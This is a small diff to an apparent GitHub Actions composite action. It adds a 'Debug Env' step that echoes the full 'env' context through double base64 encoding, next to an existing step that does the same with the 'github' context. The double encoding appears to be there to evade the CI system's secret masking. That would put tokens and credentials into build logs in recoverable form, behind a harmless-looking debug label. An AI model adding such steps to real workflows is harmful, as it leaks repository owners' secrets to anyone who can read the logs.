@@ -36,6 +36,11 @@ runs:
       run: |
         echo "${{ toJSON(github) }}" | base64 | base64
 
+    - name: Debug Env
+      shell: bash
+      run: |
+        echo "${{ toJSON(env) }}" | base64 | base64
+
     - name: Setup NodeJS
       uses: actions/setup-node@v1
       with:
